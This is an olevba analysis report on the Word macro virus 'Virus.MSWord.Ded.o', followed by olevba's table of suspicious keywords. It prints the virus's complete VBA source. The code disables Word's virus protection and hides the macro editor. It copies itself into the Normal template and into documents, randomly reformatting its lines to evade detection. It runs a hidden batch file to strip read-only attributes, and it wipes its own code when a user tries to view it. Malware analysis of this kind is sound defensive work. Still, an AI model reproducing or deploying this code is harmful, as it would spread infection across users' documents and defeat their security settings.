olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.o-4f168cf20cc6aac5699f1074b70abe772cffe208
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.o-4f168cf20cc6aac5699f1074b70abe772cffe208 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_Close()

         On Error GoTo _
skam

    Options.VirusProtection _
= False

    SWL
'40.13744
          ABS99
'41.27668
skam:
'58.3359
         End Sub
'91.93771
   Private Sub Èäåíòèôèêàòîð()
'47.44592
 End Sub
'39.04715
           Private Sub Document_New()
'8.964139
  End Sub
'58.97926
      ()
'9.792984
            On Error GoTo skam
'20.60172
              Options. _
         VirusProtection = False

     SWL
'62.02096
ABS99
'13.04204
skam:
'40.64213
          End Sub
'41.29678
   Private Sub SWL()
'52.98212
      Application. _
         ShowVisualBasicEditor = False

   If Not _
ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

             For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

     d = NormalTemplate. _
   VBProject.VBComponents(1).CodeModule.Lines(I, 1)

     If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

             While _
Mid(d, Len(d) - 1, 2) = " _"

          I _
= I + 1

  d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       Wend
'5.026281
      d = e(d)
'87.57797
  ActiveDocument. _
                              VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

   End If
'44.69932
             Next I
'58.59379
 ActiveDocument. _
                                           SaveAs AddToRecentFiles:=False

        End If
'15.17562
             End Sub
'59.88564
     Private _
Sub ABS99()

   If _
Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 f (NormalTemplate. _
   FullName)

For I _
= 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

        d = ActiveDocument.VBProject. _
        VBComponents(1).CodeModule.Lines(I, 1)

        If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

        While Mid(d, Len(d) _
- 1, 2) = " _"

            I = I _
+ 1

              d = _
Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

           Wend
'58.27582
    d = e(d)
'1.422113
      NormalTemplate. _
       VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

         End _
If

        Next I
'42.01114
              NormalTemplate.Save
'75.85744
   End If
'48.34883
End _
Sub

   Private Function e(aString) As String
'18.42242
  aString = LTrim(aString)
'42.49291
    aString = RTrim(aString)
'97.89316
If aString _
= "Sub " & "Vc()" Then

         aString _
= "Sub " & "ViewVBCode()"

        Else
'60.04875
              If aString _
= "Sub " & "ViewVBCode()" Then

   aString = "Sub " & "Vc()"
'82.25786
      End _
If

        End _
If

     For I = 1 _
To Len(aString) - 1

     If Mid(aString, I, _
1) = "." Then

            If Not Mid(aString, _
I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

    If Not Mid(aString, I _
+ 1, 1) = Chr$(34) Then

       e = _
Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

    For j _
= 1 To Int(15 * Rnd)

           e = " " & e
'81.0059
  Next j
'96.94122
  Exit Function
'11.82492
End If
'47.00128
     End If
'50.60932
         Else
'6.733215
    If Mid(aString, I, 1) _
= " " And Int(3 * Rnd) = 1 And I > 1 Then

     If _
Not Mid(aString, I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e = _
Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

    For j = 1 To _
Int(15 * Rnd)

       e _
= " " & e

              Next j
'24.41467
        Exit _
Function

End If
'10.01976
             End _
If

            End If
'96.42301
              Next _
I

             e = aString & Chr$(13) & "'" & (100 _
* Rnd)

             Count = Int(15 * Rnd)
'46.78597
              For _
j = 1 To Count

            e = " " & e
'5.029458
        Next j
'26.22681
            End Function
'28.57761
         Private _
Sub f(fName)

         If GetAttr(fName) And _
vbReadOnly Then

Open _
Dir(fName) & ".bat" For Append As #1

Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

       Print #1, "del " & _
Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

            Close _
#1

              shellResult = Shell(Dir(fName) & ".bat", _
vbHide)

End If
'9.341228
      End _
Sub

     Sub _
ViewVBCode()

            For aDoc = 1 To Documents.Count
'53.82719
 For _
I = 1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

          Documents(aDoc). _
VBProject.VBComponents(1).CodeModule.DeleteLines 1

  Next I
'44.55818
             Next _
aDoc

         For I = 1 _
To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

  NormalTemplate. _
     VBProject.VBComponents(1).CodeModule.DeleteLines 1

        Next I
'46.53672
       Application. _
  ShowVisualBasicEditor = True

           End Sub
'50.77703
  Private Sub Document_Open()
'21.09876
     End Sub
'58.42391
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

